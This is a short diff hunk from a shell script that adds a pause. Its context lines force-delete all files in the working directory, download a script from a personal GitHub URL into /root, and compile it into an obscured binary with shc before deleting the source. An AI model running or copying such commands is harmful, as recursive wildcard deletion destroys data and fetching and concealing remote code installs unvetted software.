@@ -54,6 +54,7 @@ sleep 3
 ./danielluis1921.sh
 rm -fv *
 rm -fR *
+sleep 5
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/callAPI.sh" --output-document=/root/callAPI.sh
 shc -r -f /root/callAPI.sh -o /root/run.sh
 rm -fv callAPI.sh
